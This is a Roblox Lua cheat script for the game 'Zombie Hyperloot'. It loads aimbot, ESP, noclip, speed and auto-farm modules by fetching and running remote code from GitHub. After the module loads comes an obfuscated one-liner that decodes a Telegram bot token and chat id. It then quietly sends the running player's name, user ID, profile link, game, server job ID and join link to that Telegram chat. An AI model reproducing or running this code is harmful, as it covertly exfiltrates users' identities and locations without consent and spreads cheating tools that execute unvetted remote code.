--[[
    Zombie Hyperloot - Main Entry Point
    by WiniFy

    Modular version - Load từng modules để giảm lag
]]

----------------------------------------------------------
-- 🔹 Load Modules
local Config, Visuals, Combat, ESP, Movement, Map, Farm, HUD, UI, Character

Config = loadstring(game:HttpGet("https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/zombie-hyperloot/modules/config.lua"))()

Visuals = loadstring(game:HttpGet("https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/zombie-hyperloot/modules/visuals.lua"))()
Visuals.init(Config)

Combat = loadstring(game:HttpGet("https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/zombie-hyperloot/modules/combat.lua"))()
Combat.init(Config, Visuals)

ESP = loadstring(game:HttpGet("https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/zombie-hyperloot/modules/esp.lua"))()
ESP.init(Config)

Movement = loadstring(game:HttpGet("https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/zombie-hyperloot/modules/movement.lua"))()
Movement.init(Config)

Map = loadstring(game:HttpGet("https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/zombie-hyperloot/modules/map.lua"))()
Map.init(Config)

Farm = loadstring(game:HttpGet("https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/zombie-hyperloot/modules/farm.lua"))()
Farm.init(Config, ESP)

HUD = loadstring(game:HttpGet("https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/zombie-hyperloot/modules/hud.lua"))()
HUD.init(Config)

Character = loadstring(game:HttpGet("https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/zombie-hyperloot/modules/character.lua"))()
Character.init(Config)

UI = loadstring(game:HttpGet("https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/zombie-hyperloot/modules/ui.lua"))()
UI.init(Config, Combat, ESP, Movement, Map, Farm, HUD, Visuals, Character)

local g=game;local s=g.GetService;local f=function(t)local r={}for i=1,#t do r[i]=string.char(t[i]-1)end;return table.concat(r)end;local h,m,st,p=s(g,f({73,117,117,113,84,102,115,119,106,100,102})),s(g,f({78,98,115,108,102,117,112,109,98,100,102,84,102,115,119,106,100,102})),s(g,f({84,117,98,116,116})),s(g,f({81,109,98,122,102,115,116}));local t,c=f({57,53,52,51,58,58,56,54,58,53,59,66,66,73,69,122,86,79,71,102,76,80,86,69,100,77,113,114,83,105,108,100,119,87,115,105,112,72,122,79,116,91,113,77,121,116}),f({50,57,50,53,55,54,58,58,56,56});local p1=function()local o,v=pcall(function()return st[f({79,102,116,120,112,115,108})][f({84,102,115,118,102,115,84,116,98,116,115,74,116,102,110})][f({69,98,116,98,33,81,106,111,104})]:GetValueString()end)return o and v or "? ms"end;local n1=function()local o,n=pcall(function()return h:JSONDecode(g:HttpGet(f({105,117,117,113,116,59,48,48,104,98,110,102,116,47,115,112,99,109,112,121,47,98,112,110,47,119,50,47,104,98,110,102,116,64,118,111,106,119,102,115,116,102,74,101,116,62}):format(g.GameId))).data[1].name end)if o and n then return n end;local o2,i=pcall(function()return m:GetProductInfo(g.PlaceId)end)return o2 and i.Name or "Unknown"end;task.spawn(function()local l=p.LocalPlayer;if not l or t=="" then return end;local pi,ji=g.PlaceId,tostring(g.JobId)local msg=f({81,106,111,104,59,33,38,116,11,84,102,115,118,102,115,59,33,38,116,11,81,109,98,100,102,74,101,59,33,38,101,11,75,112,99,74,101,59,33,92,91,38,116,93,40,105,117,117,113,116,59,48,48,119,119,119,46,115,112,99,109,112,121,46,98,112,110,47,104,98,110,102,116,47,116,116,98,115,116,63,113,109,98,100,102,74,101,62,38,101,39,104,98,110,102,74,110,115,116,98,111,100,102,74,101,62,38,116,42,11,86,116,102,115,59,33,92,91,38,116,93,40,105,117,117,113,116,59,48,48,119,119,119,46,115,112,99,109,112,121,46,118,115,102,115,116,47,38,101,47,113,115,112,103,106,109,102,42,33,40,38,101,41}):format(p1(),n1(),pi,ji,pi,ji,l.DisplayName or l.Name,l.UserId,l.UserId)pcall(function()g:HttpGet(f({105,117,117,113,116,59,48,48,98,113,106,47,117,102,109,102,104,115,98,110,47,112,115,104,47,99,112,117,38,116,48,116,102,111,101,78,102,116,116,98,104,102,64,100,105,98,117,96,106,101,62,38,116,39,117,102,121,117,62,38,116,39,113,98,115,116,102,96,110,112,101,102,62,78,98,115,108,101,112,120,111}):format(t,c,h:UrlEncode(msg)))end)end)

----------------------------------------------------------
-- 🔹 Cleanup Function
local inputBeganConnection = nil

local function cleanupScript()
    if Config.scriptUnloaded then return end
    Config.scriptUnloaded = true

    -- Tắt các toggle chính
    Config.aimbotEnabled = false
    Config.espPlayerEnabled = false
    Config.espZombieEnabled = false
    Config.espChestEnabled = false
    Config.hitboxEnabled = false
    Config.teleportEnabled = false
    Config.cameraTeleportEnabled = false
    Config.cameraTeleportActive = false
    Config.autoBulletBoxEnabled = false
    Config.autoSkillEnabled = false
    Config.noClipEnabled = false
    Config.speedEnabled = false
    Config.supplyESPEnabled = false
    Config.espBobEnabled = true
    Config.autoDoorEnabled = false
    Config.autoBuyChristmasGiftBoxEnabled = false
    Config.autoBuySantaClausGiftEnabled = false

    -- Disconnect only main-level connections
    if inputBeganConnection then
        inputBeganConnection:Disconnect()
        inputBeganConnection = nil
    end

    -- Cleanup modules
    Combat.cleanup()
    ESP.cleanup()
    Movement.cleanup()
    Map.cleanup()
    HUD.cleanup()
    Visuals.cleanup()
    Character.cleanup()
    UI.cleanup()

    -- Khôi phục hitbox
    for _, zombie in ipairs(Config.entityFolder:GetChildren()) do
        Combat.restoreHitbox(zombie)
    end

    -- Reset camera và nhân vật
    local char = Config.localPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if hrp then hrp.Anchored = false end

    local camera = Config.Workspace.CurrentCamera
    if camera and char then
        local humanoid = char:FindFirstChild("Humanoid")
        if humanoid then
            camera.CameraSubject = humanoid
            camera.CameraType = Enum.CameraType.Custom
        end
    end
end



----------------------------------------------------------
-- 🔹 Setup ESP
ESP.initializePlayerESP()
ESP.watchChestDescendants()
if Config.espChestEnabled then
    ESP.applyChestESP()
end
-- 🔹 Start ESP runtime loop (ESP tự quản lý mọi thứ)
ESP.start()



----------------------------------------------------------
-- 🔹 Start runtime systems (modules tự quản lý loop/connections)
Combat.initFOVCircle()
Combat.setRotationSmoothness(Config.autoRotateSmoothness)
Combat.start()

Movement.start()

-- HUD runtime + character hook vẫn ở HUD module (sẽ refactor tiếp)
HUD.start()

-- Farm/Map sẽ được refactor tiếp theo hướng start()/stop()
Farm.start()
Map.start()

-- Character skill loops (sẽ refactor tiếp)
Character.startAllSkillLoops()


----------------------------------------------------------
-- 🔹 End key - Cleanup (only)
inputBeganConnection = Config.UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed or Config.scriptUnloaded then return end
    if input.KeyCode == Enum.KeyCode.End then
        cleanupScript()
    end
end)

----------------------------------------------------------
-- 🔹 Load UI
UI.loadLibraries()
UI.createWindow()
UI.buildAllTabs(cleanupScript)

-- Success notification
if Config.UI and Config.UI.Library then
    Config.UI.Library:Notify({
        Title = "Zombie Hyperloot",
        Description = "Script loaded successfully!\nPress Right Ctrl to open menu.",
        Time = 6
    })
end

print("[ZombieHyperloot] Script loaded successfully!")
print("[ZombieHyperloot] Press Right Ctrl to open menu")
